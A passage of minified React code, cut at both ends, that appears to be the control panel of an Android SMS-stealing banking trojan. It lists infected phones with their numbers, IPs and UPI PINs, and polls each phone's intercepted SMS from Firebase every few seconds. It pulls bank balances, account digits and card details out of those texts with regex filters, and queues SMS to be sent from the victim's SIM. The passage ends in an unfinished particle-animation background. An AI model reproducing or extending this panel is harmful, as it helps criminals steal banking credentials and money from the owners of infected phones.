                            className: "text-xs sm:text-sm font-bold text-white truncate leading-tight",
                            children: A.name
                        }), r.jsx("p", {
                            className: "text-[9px] sm:text-[10px] font-mono text-[#555] mt-0.5 truncate",
                            children: A.id
                        })]
                    }), r.jsxs("div", {
                        className: "flex items-center gap-1 flex-shrink-0",
                        children: [r.jsx("button", {
                            onClick: x => {
                                x.stopPropagation();
                                toggleStar && toggleStar(A.id);
                            },
                            className: `p-1 sm:p-1.5 rounded-lg transition-all ${isStar ? "bg-amber-500/20 text-amber-400 border border-amber-500/40" : "text-[#444] hover:text-amber-400 hover:bg-white/5"}`,
                            title: isStar ? "Starred (Seen)" : "Mark as Starred (Seen)",
                            children: r.jsx("svg", {
                                className: "w-3.5 h-3.5 sm:w-4 sm:h-4 fill-current",
                                viewBox: "0 0 24 24",
                                children: r.jsx("path", {
                                    d: "M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"
                                })
                            })
                        }), A.upipin && r.jsx(hh, {
                            className: "w-3.5 h-3.5 text-amber-400"
                        }), S && r.jsx($l, {
                            className: "w-3.5 h-3.5 text-emerald-400"
                        }), f && r.jsx(Wl, {
                            className: "w-3.5 h-3.5 text-purple-400"
                        }), r.jsx("button", {
                            onClick: x => {
                                x.stopPropagation(), tt()
                            },
                            className: "p-1 rounded-lg text-[#444] hover:text-[#888] hover:bg-white/5 transition-colors",
                            children: r.jsx(tp, {
                                className: "w-3.5 h-3.5"
                            })
                        })]
                    })]
                }), r.jsxs("div", {
                    className: "grid grid-cols-2 gap-3 mb-3",
                    children: [r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                            children: "Android"
                        }), r.jsx("p", {
                            className: "text-sm font-bold text-[#ccc]",
                            children: A.android !== "—" ? `v${A.android.replace("v","")}` : "—"
                        })]
                    }), r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                            children: "Battery"
                        }), r.jsx(r1, {
                            percent: A.batteryPercent
                        })]
                    })]
                }), r.jsxs("div", {
                    className: "grid grid-cols-2 gap-3 mb-3",
                    children: [r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                            children: "Number"
                        }), r.jsx("p", {
                            className: "text-xs font-mono text-[#aaa] truncate",
                            children: h
                        })]
                    }), o && r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1",
                            children: "Network"
                        }), r.jsx("p", {
                            className: "text-xs font-semibold text-[#aaa] truncate",
                            children: o
                        })]
                    })]
                }), p && r.jsxs("div", {
                    className: "mb-3 px-3 py-2 rounded-xl bg-emerald-950/20 border border-emerald-900/20",
                    children: [r.jsxs("div", {
                        className: "flex items-center justify-between",
                        children: [r.jsxs("div", {
                            className: "flex items-center gap-1.5",
                            children: [r.jsx($l, {
                                className: "w-3.5 h-3.5 text-emerald-400"
                            }), r.jsx("span", {
                                className: "text-[10px] font-semibold text-emerald-400",
                                children: p.bankName
                            }), p.accountLast4 && r.jsxs("span", {
                                className: "text-[9px] font-mono text-[#444]",
                                children: ["••", p.accountLast4]
                            })]
                        }), r.jsxs("span", {
                            className: "text-sm font-black text-white",
                            children: ["₹", Pl(p.availableBalance)]
                        })]
                    }), p.transactionType && r.jsxs("div", {
                        className: "flex items-center gap-1 mt-1",
                        children: [p.transactionType === "credit" ? r.jsx(dh, {
                            className: "w-3 h-3 text-emerald-500"
                        }) : r.jsx(fh, {
                            className: "w-3 h-3 text-red-500"
                        }), r.jsxs("span", {
                            className: `text-[9px] font-semibold ${p.transactionType==="credit"?"text-emerald-500":"text-red-500"}`,
                            children: [p.transactionType === "credit" ? "+" : "-", "₹", Pl(p.transactionAmount || "0"), " ", p.transactionType]
                        })]
                    })]
                }), f && r.jsxs("div", {
                    className: "mb-3 px-3 py-1.5 rounded-xl bg-purple-950/20 border border-purple-900/20 flex items-center gap-2",
                    children: [r.jsx(Wl, {
                        className: "w-3.5 h-3.5 text-purple-400"
                    }), r.jsxs("span", {
                        className: "text-[10px] font-semibold text-purple-400",
                        children: ["Card ••", d.cards[0].cardLast4]
                    }), d.cards[0].cardType && r.jsx("span", {
                        className: "text-[10px] text-[#555]",
                        children: d.cards[0].cardType
                    }), r.jsx("span", {
                        className: "ml-auto text-[9px] text-purple-600",
                        children: "Available"
                    })]
                }), r.jsxs("div", {
                    className: "flex items-center gap-2 flex-wrap",
                    children: [r.jsx("span", {
                        className: `w-2 h-2 rounded-full flex-shrink-0 ${b?"bg-emerald-500":"bg-[#333]"}`,
                        style: b ? {
                            boxShadow: "0 0 6px #22c55e"
                        } : {}
                    }), b ? r.jsx("span", {
                        className: "text-xs font-semibold text-emerald-400",
                        children: "Online"
                    }) : r.jsxs("div", {
                        className: "flex items-center gap-1.5 min-w-0",
                        children: [r.jsx("span", {
                            className: "text-xs text-[#555]",
                            children: "Offline"
                        }), A.lastSeen && r.jsx("span", {
                            className: "text-[10px] font-mono text-[#444] bg-[#111] px-1.5 py-0.5 rounded border border-[#1e1e1e]",
                            children: vs(A.lastSeen)
                        })]
                    }), A.upipin && r.jsx("span", {
                        className: "ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400",
                        children: "UPI PIN"
                    })]
                })]
            })
        }

        function ta({
            label: A,
            value: tt,
            mono: b,
            highlight: d
        }) {
            return r.jsxs("div", {
                className: "flex items-start justify-between py-2.5 border-b border-[#1a1a1a] last:border-0",
                children: [r.jsx("span", {
                    className: "text-xs text-[#555] font-medium flex-shrink-0 w-32",
                    children: A
                }), r.jsx("span", {
                    className: `text-xs text-right break-all ${b?"font-mono":"font-semibold"} ${d||"text-[#ccc]"}`,
                    children: tt || "—"
                })]
            })
        }

        function d1({
            dev: A,
            fbUrl: tt,
            fbKey: b,
            onClose: d,
            onDelete: S,
            showToast: f
        }) {
            const actualFbUrl = A._accountUrl || tt;
            const actualFbKey = A._accountKey || b;
            const [p, h] = jt.useState([]), [o, x] = jt.useState({
                bankBalances: [],
                cards: [],
                phoneNumbers: [],
                networks: []
            }), [T, w] = jt.useState(!0), [C, v] = jt.useState(""), [E, g] = jt.useState(""), [z, N] = jt.useState(1), [k, M] = jt.useState(!1), [H, L] = jt.useState("info"), nt = jt.useRef(null), V = jt.useCallback(async () => {
                try {
                    const c = await yn(actualFbUrl, actualFbKey, `messages/${A.id}`),
                        I = Gu(c);
                    h(I), x(Xu(I))
                } catch (c) {
                    (c instanceof Error ? c.message : String(c)).includes("PERMISSION_DENIED") && f("Firebase permission denied — check your Database Secret key"), h([])
                } finally {
                    w(!1)
                }
            }, [A.id, actualFbUrl, actualFbKey, f]);
            jt.useEffect(() => (V(), nt.current = setInterval(async () => {
                try {
                    const c = await yn(actualFbUrl, actualFbKey, `messages/${A.id}`),
                        I = Gu(c);
                    h(Z => {
                        if (JSON.stringify(I.map(q => q.text)) !== JSON.stringify(Z.map(q => q.text))) {
                            const q = Xu(I);
                            return x(q), q.bankBalances.length > 0 ? f("New bank SMS detected") : f("New message received"), I
                        }
                        return Z
                    })
                } catch {}
            }, 6e3), () => {
                nt.current && clearInterval(nt.current)
            }), [V, A.id, actualFbUrl, actualFbKey, f]);
            const ot = async () => {
                    if (!C || !E) {
                        f("Fill number and message");
                        return
                    }
                    M(!0);
                    try {
                        await Zp(actualFbUrl, actualFbKey, `clients/${A.id}/webhookEvent/sendSms`, {
                            from: z,
                            to: C,
                            message: E,
                            isSended: !1
                        }), f("SMS queued!"), g("")
                    } catch (c) {
                        const I = c instanceof Error ? c.message : String(c);
                        f(I.includes("PERMISSION_DENIED") ? "Firebase permission denied — cannot send" : "Send failed")
                    } finally {
                        M(!1)
                    }
                },
                $ = async () => {
                    if (confirm(`Delete "${A.name}" permanently?`)) try {
                        await Gp(actualFbUrl, actualFbKey, `clients/${A.id}`), f("Device deleted"), S()
                    } catch (c) {
                        const I = c instanceof Error ? c.message : String(c);
                        f(I.includes("PERMISSION_DENIED") ? "Firebase permission denied" : "Delete failed")
                    }
                },
                ht = A.batteryPercent >= 60 ? "#86efac" : A.batteryPercent >= 30 ? "#fde68a" : "#ef4444",
                xt = A.phoneNumber && A.phoneNumber !== "—" ? A.phoneNumber : o.phoneNumbers[0] || "—",
                D = A.provider && A.provider !== "—" ? A.provider : o.networks[0] || "—",
                at = [{
                    key: "info",
                    label: "Info"
                }, {
                    key: "bank",
                    label: `Bank (${o.bankBalances.length})`
                }, ...o.cards.length > 0 ? [{
                    key: "card",
                    label: `Card (${o.cards.length})`
                }] : [], {
                    key: "sms",
                    label: `SMS (${p.length})`
                }, {
                    key: "send",
                    label: "Send"
                }];
            return r.jsxs("div", {
                className: "fixed inset-0 z-50 flex",
                onClick: d,
                children: [r.jsx("div", {
                    className: "absolute inset-0 bg-black/70 backdrop-blur-sm"
                }), r.jsxs("div", {
                    className: "relative ml-auto w-full max-w-md h-full flex flex-col bg-[#0d0d0d] border-l border-[#1f1f1f] shadow-2xl",
                    onClick: c => c.stopPropagation(),
                    children: [r.jsxs("div", {
                        className: "flex items-center justify-between px-5 py-4 border-b border-[#1a1a1a]",
                        children: [r.jsxs("div", {
                            className: "flex items-center gap-3",
                            children: [r.jsx("div", {
                                className: `w-9 h-9 rounded-xl flex items-center justify-center ${A.status?"bg-emerald-500/15 border border-emerald-500/25":"bg-[#1a1a1a] border border-[#262626]"}`,
                                children: r.jsx(bs, {
                                    className: `w-4 h-4 ${A.status?"text-emerald-400":"text-[#444]"}`
                                })
                            }), r.jsxs("div", {
                                children: [r.jsx("h3", {
                                    className: "text-sm font-bold text-white",
                                    children: A.name
                                }), r.jsx("p", {
                                    className: "text-[10px] font-mono text-[#555] mt-0.5",
                                    children: A.id
                                })]
                            })]
                        }), r.jsxs("div", {
                            className: "flex items-center gap-2",
                            children: [r.jsx("button", {
                                onClick: $,
                                className: "p-2 rounded-xl bg-red-950/40 border border-red-900/30 text-red-400 hover:bg-red-950/70 transition-colors",
                                children: r.jsx(oh, {
                                    className: "w-4 h-4"
                                })
                            }), r.jsx("button", {
                                onClick: d,
                                className: "p-2 rounded-xl bg-[#1a1a1a] border border-[#262626] text-[#888] hover:text-white transition-colors",
                                children: r.jsx(nl, {
                                    className: "w-4 h-4"
                                })
                            })]
                        })]
                    }), r.jsxs("div", {
                        className: "flex items-center gap-3 px-5 py-2.5 bg-[#0a0a0a] border-b border-[#1a1a1a] flex-wrap",
                        children: [r.jsxs("div", {
                            className: "flex items-center gap-1.5",
                            children: [r.jsx("span", {
                                className: `w-2 h-2 rounded-full ${A.status?"bg-emerald-500":"bg-[#333]"}`,
                                style: A.status ? {
                                    boxShadow: "0 0 6px #22c55e"
                                } : {}
                            }), r.jsx("span", {
                                className: `text-xs font-semibold ${A.status?"text-emerald-400":"text-[#555]"}`,
                                children: A.status ? "Online" : "Offline"
                            }), !A.status && A.lastSeen && r.jsxs("span", {
                                className: "text-[10px] font-mono text-red-400/70",
                                children: ["since ", vs(A.lastSeen)]
                            })]
                        }), r.jsxs("div", {
                            className: "flex items-center gap-1",
                            children: [r.jsx("span", {
                                className: "text-[10px] text-[#555]",
                                children: "Bat"
                            }), r.jsx("span", {
                                className: "text-[10px] font-bold",
                                style: {
                                    color: ht
                                },
                                children: A.battery
                            })]
                        }), A.upipin && r.jsxs("span", {
                            className: "px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400",
                            children: ["UPI: ", A.upipin.split("|")[0]]
                        }), o.bankBalances.length > 0 && r.jsxs("span", {
                            className: "px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[10px] font-semibold text-emerald-400",
                            children: [o.bankBalances.length, " Bank SMS"]
                        }), o.cards.length > 0 && r.jsxs("span", {
                            className: "px-2 py-0.5 rounded-full bg-purple-500/10 border border-purple-500/20 text-[10px] font-semibold text-purple-400",
                            children: [o.cards.length, " Card"]
                        })]
                    }), r.jsx("div", {
                        className: "flex border-b border-[#1a1a1a] px-2 overflow-x-auto",
                        children: at.map(c => r.jsx("button", {
                            onClick: () => L(c.key),
                            className: `px-3 py-3 text-[11px] font-semibold border-b-2 whitespace-nowrap transition-all ${H===c.key?c.key==="bank"?"border-emerald-500 text-emerald-400":c.key==="card"?"border-purple-500 text-purple-400":"border-red-500 text-red-400":"border-transparent text-[#555] hover:text-[#888]"}`,
                            children: c.label
                        }, c.key))
                    }), r.jsxs("div", {
                        className: "flex-1 overflow-y-auto",
                        children: [H === "info" && r.jsxs("div", {
                            className: "px-5 py-4",
                            children: [!A.status && A.lastSeen && r.jsxs("div", {
                                className: "mb-4 p-3 rounded-xl bg-red-950/20 border border-red-900/30 border-l-2 border-l-red-500/60",
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-red-700 mb-1 font-semibold",
                                    children: "Last Seen (Offline Since)"
                                }), r.jsx("p", {
                                    className: "text-base font-black text-red-400",
                                    children: vs(A.lastSeen)
                                }), r.jsx("p", {
                                    className: "text-[10px] font-mono text-red-700/70 mt-0.5",
                                    children: lh(A.lastSeen)
                                })]
                            }), A.status && A.lastSeen && r.jsxs("div", {
                                className: "mb-4 p-3 rounded-xl bg-emerald-950/20 border border-emerald-900/30",
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-emerald-700 mb-1 font-semibold",
                                    children: "Last Activity"
                                }), r.jsx("p", {
                                    className: "text-[11px] font-mono text-emerald-500",
                                    children: lh(A.lastSeen)
                                })]
                            }), r.jsx("p", {
                                className: "text-[10px] uppercase tracking-widest text-[#444] mb-3 font-semibold",
                                children: "Device"
                            }), r.jsx(ta, {
                                label: "Phone Number",
                                value: xt,
                                mono: !0
                            }), r.jsx(ta, {
                                label: "Network",
                                value: D
                            }), r.jsx(ta, {
                                label: "Android",
                                value: A.android
                            }), r.jsx(ta, {
                                label: "IP Address",
                                value: A.ip,
                                mono: !0
                            }), r.jsx(ta, {
                                label: "Storage",
                                value: A.storage
                            }), r.jsx(ta, {
                                label: "CPU Arch",
                                value: A.cpu,
                                mono: !0
                            }), r.jsx(ta, {
                                label: "SDK Version",
                                value: A.sdk
                            }), r.jsx(ta, {
                                label: "SIM Cards",
                                value: `${A.sims.length} SIM(s)`
                            }), A.sims.map((c, I) => c.phoneNumber && r.jsx(ta, {
                                label: `SIM ${I+1} Number`,
                                value: c.phoneNumber,
                                mono: !0
                            }, I)), o.phoneNumbers.length > 0 && r.jsxs(r.Fragment, {
                                children: [r.jsx("p", {
                                    className: "text-[10px] uppercase tracking-widest text-[#444] mt-4 mb-3 font-semibold",
                                    children: "From SMS"
                                }), o.phoneNumbers.map((c, I) => r.jsx(ta, {
                                    label: `Phone #${I+1}`,
                                    value: c,
                                    mono: !0,
                                    highlight: "text-blue-400"
                                }, I))]
                            }), o.networks.length > 0 && o.networks.map((c, I) => r.jsx(ta, {
                                label: `Network #${I+1}`,
                                value: c,
                                highlight: "text-purple-400"
                            }, I))]
                        }), H === "bank" && r.jsxs("div", {
                            className: "flex flex-col h-full",
                            children: [r.jsxs("div", {
                                className: "flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]",
                                children: [r.jsxs("div", {
                                    children: [r.jsxs("span", {
                                        className: "text-xs text-[#555]",
                                        children: ["Auto-detected from ", p.length, " SMS"]
                                    }), o.bankBalances.length > 0 && r.jsxs("p", {
                                        className: "text-[10px] text-emerald-600/70 mt-0.5",
                                        children: [o.bankBalances.length, " bank message(s) found"]
                                    })]
                                }), r.jsx("button", {
                                    onClick: V,
                                    className: "p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors",
                                    children: r.jsx(ys, {
                                        className: "w-3.5 h-3.5"
                                    })
                                })]
                            }), r.jsx("div", {
                                className: "flex-1 overflow-y-auto px-4 py-3 space-y-2",
                                children: T ? r.jsxs("div", {
                                    className: "py-12 text-center",
                                    children: [r.jsx("div", {
                                        className: "w-6 h-6 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin mx-auto mb-3"
                                    }), r.jsx("p", {
                                        className: "text-xs text-[#555]",
                                        children: "Scanning bank SMS..."
                                    })]
                                }) : o.bankBalances.length === 0 ? r.jsxs("div", {
                                    className: "py-12 text-center",
                                    children: [r.jsx($l, {
                                        className: "w-10 h-10 mx-auto mb-3 text-[#2a2a2a]"
                                    }), r.jsx("p", {
                                        className: "text-sm font-medium text-[#444]",
                                        children: "No bank SMS found"
                                    }), r.jsx("p", {
                                        className: "text-xs text-[#333] mt-1 px-4 leading-relaxed",
                                        children: "Bank transaction SMS with balance will appear here automatically"
                                    })]
                                }) : r.jsxs(r.Fragment, {
                                    children: [r.jsxs("div", {
                                        className: "p-3 rounded-xl bg-[#081410] border border-emerald-900/40 mb-1",
                                        children: [r.jsxs("p", {
                                            className: "text-[10px] uppercase tracking-widest text-emerald-700 mb-1",
                                            children: ["Latest Balance · ", o.bankBalances[0].bankName]
                                        }), r.jsxs("div", {
                                            className: "flex items-end gap-2",
                                            children: [r.jsxs("span", {
                                                className: "text-2xl font-black text-white",
                                                children: ["₹", Pl(o.bankBalances[0].availableBalance)]
                                            }), o.bankBalances[0].accountLast4 && r.jsxs("span", {
                                                className: "text-xs text-emerald-700 mb-0.5 font-mono",
                                                children: ["••", o.bankBalances[0].accountLast4]
                                            })]
                                        })]
                                    }), o.bankBalances.map((c, I) => r.jsx(c1, {
                                        balance: c
                                    }, I))]
                                })
                            })]
                        }), H === "card" && r.jsxs("div", {
                            className: "flex flex-col h-full",
                            children: [r.jsxs("div", {
                                className: "flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]",
                                children: [r.jsx("span", {
                                    className: "text-xs text-[#555]",
                                    children: "Card info found in SMS messages"
                                }), r.jsx("button", {
                                    onClick: V,
                                    className: "p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors",
                                    children: r.jsx(ys, {
                                        className: "w-3.5 h-3.5"
                                    })
                                })]
                            }), r.jsx("div", {
                                className: "flex-1 overflow-y-auto px-4 py-3 space-y-2",
                                children: o.cards.length === 0 ? r.jsxs("div", {
                                    className: "py-12 text-center",
                                    children: [r.jsx(Wl, {
                                        className: "w-10 h-10 mx-auto mb-3 text-[#2a2a2a]"
                                    }), r.jsx("p", {
                                        className: "text-sm font-medium text-[#444]",
                                        children: "No card info found"
                                    })]
                                }) : o.cards.map((c, I) => r.jsx(o1, {
                                    card: c
                                }, I))
                            })]
                        }), H === "sms" && r.jsxs("div", {
                            className: "flex flex-col h-full",
                            children: [r.jsxs("div", {
                                className: "flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]",
                                children: [r.jsx("span", {
                                    className: "text-xs text-[#555]",
                                    children: "Last 60 messages · auto-refreshes"
                                }), r.jsx("button", {
                                    onClick: V,
                                    className: "p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors",
                                    children: r.jsx(ys, {
                                        className: "w-3.5 h-3.5"
                                    })
                                })]
                            }), r.jsx("div", {
                                className: "flex-1 overflow-y-auto px-4 py-3 space-y-2",
                                children: T ? r.jsxs("div", {
                                    className: "py-12 text-center",
                                    children: [r.jsx("div", {
                                        className: "w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3"
                                    }), r.jsx("p", {
                                        className: "text-xs text-[#555]",
                                        children: "Loading messages…"
                                    })]
                                }) : p.length === 0 ? r.jsxs("div", {
                                    className: "py-12 text-center",
                                    children: [r.jsx(hp, {
                                        className: "w-10 h-10 mx-auto mb-3 text-[#2a2a2a]"
                                    }), r.jsx("p", {
                                        className: "text-sm font-medium text-[#444]",
                                        children: "No messages"
                                    })]
                                }) : p.map((c, I) => {
                                    const Z = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(c.text),
                                        q = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(c.text),
                                        mt = q ? "border-l-purple-600/60" : Z ? "border-l-emerald-600/60" : "border-l-red-600/60",
                                        it = q ? "bg-[#100d18]" : Z ? "bg-[#0a130d]" : "bg-[#111]",
                                        bt = q ? "text-purple-400" : Z ? "text-emerald-400" : "text-red-400";
                                    return r.jsxs("div", {
                                        className: `p-3 rounded-xl border border-[#1e1e1e] border-l-2 ${mt} ${it}`,
                                        children: [r.jsxs("div", {
                                            className: "flex items-center justify-between mb-2",
                                            children: [r.jsxs("div", {
                                                className: "flex items-center gap-1.5",
                                                children: [r.jsx("span", {
                                                    className: `text-xs font-bold ${bt}`,
                                                    children: c.sender
                                                }), Z && r.jsx($l, {
                                                    className: "w-3 h-3 text-emerald-600/70"
                                                }), q && r.jsx(Wl, {
                                                    className: "w-3 h-3 text-purple-600/70"
                                                })]
                                            }), r.jsx("span", {
                                                className: "text-[10px] text-[#444] font-mono",
                                                children: c.time
                                            })]
                                        }), r.jsx("p", {
                                            className: "text-xs text-[#aaa] leading-relaxed",
                                            children: c.text.substring(0, 250)
                                        })]
                                    }, I)
                                })
                            })]
                        }), H === "send" && r.jsxs("div", {
                            className: "px-5 py-4 space-y-4",
                            children: [r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2",
                                    children: "Select SIM"
                                }), r.jsx("div", {
                                    className: "flex gap-2",
                                    children: [1, 2].map(c => r.jsxs("button", {
                                        onClick: () => N(c),
                                        className: `flex-1 py-2.5 rounded-xl text-sm font-bold transition-all ${z===c?"bg-red-600 text-white shadow-lg shadow-red-900/40":"bg-[#111] border border-[#222] text-[#666] hover:border-[#333] hover:text-[#888]"}`,
                                        children: ["SIM ", c]
                                    }, c))
                                })]
                            }), r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2",
                                    children: "Recipient"
                                }), r.jsx("input", {
                                    type: "text",
                                    value: C,
                                    onChange: c => v(c.target.value),
                                    placeholder: "+919876543210",
                                    className: "w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all"
                                })]
                            }), r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2",
                                    children: "Message"
                                }), r.jsx("textarea", {
                                    value: E,
                                    onChange: c => g(c.target.value),
                                    rows: 4,
                                    placeholder: "Type your message here…",
                                    className: "w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] resize-none transition-all"
                                }), r.jsxs("p", {
                                    className: "text-[10px] text-[#444] mt-1 text-right",
                                    children: [E.length, " chars"]
                                })]
                            }), r.jsxs("button", {
                                onClick: ot,
                                disabled: k,
                                className: "w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-red-600 hover:bg-red-700 text-white font-bold text-sm shadow-lg shadow-red-900/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                                children: [k ? r.jsx("div", {
                                    className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                                }) : r.jsx(Sp, {
                                    className: "w-4 h-4"
                                }), k ? "Sending…" : `Send via SIM ${z}`]
                            }), xt && xt !== "—" && r.jsxs("button", {
                                onClick: () => v(xt),
                                className: "w-full py-2.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-[#888] hover:border-[#333] transition-all",
                                children: ["Use device number: ", r.jsx("span", {
                                    className: "font-mono text-[#888]",
                                    children: xt
                                })]
                            })]
                        })]
                    })]
                })]
            })
        }

        function h1({
            message: A,
            onDismiss: tt
        }) {
            return r.jsxs("div", {
                className: "flex items-start gap-3 px-4 py-3 bg-red-950/40 border border-red-900/30 rounded-xl mx-6 mt-3",
                children: [r.jsx(kp, {
                    className: "w-4 h-4 text-red-400 flex-shrink-0 mt-0.5"
                }), r.jsx("p", {
                    className: "text-xs text-red-300 flex-1 leading-relaxed",
                    children: A
                }), r.jsx("button", {
                    onClick: tt,
                    className: "text-red-600 hover:text-red-400 flex-shrink-0",
                    children: r.jsx(nl, {
                        className: "w-3.5 h-3.5"
                    })
                })]
            })
        }

        function m1() {
            return r.jsxs("div", {
                className: "bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 animate-pulse",
                children: [r.jsxs("div", {
                    className: "flex items-start gap-3 mb-3",
                    children: [r.jsx("div", {
                        className: "w-10 h-10 rounded-xl bg-[#1a1a1a]"
                    }), r.jsxs("div", {
                        className: "flex-1 space-y-2",
                        children: [r.jsx("div", {
                            className: "h-3 bg-[#1a1a1a] rounded w-3/4"
                        }), r.jsx("div", {
                            className: "h-2 bg-[#151515] rounded w-1/2"
                        })]
                    })]
                }), r.jsxs("div", {
                    className: "grid grid-cols-2 gap-3 mb-3",
                    children: [r.jsx("div", {
                        className: "h-8 bg-[#151515] rounded-xl"
                    }), r.jsx("div", {
                        className: "h-8 bg-[#151515] rounded-xl"
                    })]
                }), r.jsx("div", {
                    className: "h-10 bg-[#131313] rounded-xl"
                })]
            })
        }

        function Background3D() {
            const ref = jt.useRef(null);
            jt.useEffect(() => {
                const canvas = ref.current;
                if (!canvas) return;
                const ctx = canvas.getContext("2d");
                let animId;
                let w = canvas.width = window.innerWidth;
                let h = canvas.height = window.innerHeight;

                const onResize = () => {
                    w = canvas.width = window.innerWidth;
                    h = canvas.height = window.innerHeight;
                };
                window.addEventListener("resize", onResize);

                let mouseX = 0,
                    mouseY = 0,
                    targetMX = 0,
                    targetMY = 0;
                const onMouseMove = (e) => {
                    targetMX = (e.clientX - w / 2) * 0.15;
                    targetMY = (e.clientY - h / 2) * 0.15;
                };
                const onTouchMove = (e) => {
                    if (e.touches.length > 0) {
                        targetMX = (e.touches[0].clientX - w / 2) * 0.15;
                        targetMY = (e.touches[0].clientY - h / 2) * 0.15;
                    }
                };
                window.addEventListener("mousemove", onMouseMove);
                window.addEventListener("touchmove", onTouchMove);

                const count = 95;
                const particles = [];
                const fov = 350;

                for (let i = 0; i < count; i++) {
                    particles.push({
                        x: (Math.random() - 0.5) * w * 2.2,
                        y: (Math.random() - 0.5) * h * 2.2,
                        z: Math.random() * 900 + 10,
                        vx: (Math.random() - 0.5) * 0.6,
                        vy: (Math.random() - 0.5) * 0.6,
                        vz: (Math.random() - 0.5) * 1.2,
                        size: Math.random() * 2.5 + 1.2,
                        color: i % 3 === 0 ? "239, 68, 68" : i % 3 === 1 ? "245, 158, 11" : "59, 130, 246"
                    });
                }

                let time = 0;

                const loop = () => {
                    time += 0.015;
                    mouseX += (targetMX - mouseX) * 0.05;
                    mouseY += (targetMY - mouseY) * 0.05;

                    ctx.clearRect(0, 0, w, h);

                    const bgGrad = ctx.createRadialGradient(w / 2 + mouseX * 0.5, h / 2 + mouseY * 0.5, 50, w / 2, h / 2, Math.max(w, h));
                    bgGrad.addColorStop(0, "#16070a");
                    bgGrad.addColorStop(0.4, "#0b0608");
                    bgGrad.addColorStop(1, "#050505");
                    ctx.fillStyle = bgGrad;
                    ctx.fillRect(0, 0, w, h);

                    ctx.save();
                    const horizonY = h * 0.55 + mouseY * 0.3;
                    ctx.beginPath();
                    ctx.strokeStyle = "rgba(220, 38, 38, 0.08)";
                    ctx.lineWidth = 1;

                    const gridLines = 24;
                    const gridWidth = w * 2.5;
                    for (let i = -gridLines; i <= gridLines; i++) {
                        const xStart = w / 2 + mouseX + (i / gridLines) * gridWidth;
                        ctx.moveTo(xStart, h * 1.2);
                        ctx.lineTo(w / 2 + mouseX * 0.2 + (i / gridLines) * (gridWidth * 0.1), horizonY);
                    }

                    for (let j = 1; j <= 12; j++) {
                        const ratio = Math.pow(j / 12, 2.2);
                        const lineY = horizonY + (h * 0.7 - horizonY) * ratio;
                        const waveOffset = Math.sin(time + j * 0.4) * 3;
                        ctx.moveTo(0, lineY + waveOffset);
                        ctx.lineTo(w, lineY + waveOffset);
                    }
                    ctx.stroke();
                    ctx.restore();

                    const projected = [];
                    const cx = w / 2 + mouseX;
                    const cy = h / 2 + mouseY;

                    for (let i = 0; i < count; i++) {
                        const p = particles[i];
                        p.x += p.vx;
                        p.y += p.vy;
                        p.z += p.vz;

                        if (p.z <= 10) p.z = 900;
                        if (p.z > 900) p.z = 10;
                        if (p.x < -w) p.x = w;
                        if (p.x > w) p.x = -w;
                        if (p.y < -h) p.y = h;
                        if (p.y > h) p.y = -h;

                        const scale = fov / (fov + p.z);
                        const x2d = p.x * scale + cx;
                        const y2d = p.y * scale + cy;
                        const r2d = Math.max(0.4, p.size * scale);
                        const alpha = Math.min(1, Math.max(0.08, (900 - p.z) / 750));

                        projected.push({
                            x: x2d,
                            y: y2d,
                            scale,
                            alpha,
                            color: p.color,
                            z: p.z
                        });

                        ctx.beginPath();
                        ctx.arc(x2d, y2d, r2d * 1.6, 0, Math.PI * 2);
                        ctx.fillStyle = `rgba(${p.color}, ${alpha})`;
                        ctx.shadowColor = `rgba(${p.color}, ${alpha})`;
                        ctx.shadowBlur = scale * 10;
                        ctx.fill();
                        ctx.shadowBlur = 0;
                    }

                    for (let i = 0; i < projected.length; i++) {
                        for (let j = i + 1; j < projected.length; j++) {
                            const p1 = projected[i];
                            const p2 = projected[j];
                            const dx = p1.x - p2.x;
                            const dy = p1.y - p2.y;
                            const dist = Math.sqrt(dx * dx + dy * dy);
                            const maxDist = 135 * ((p1.scale + p2.scale) / 2);

                            if (dist < maxDist) {
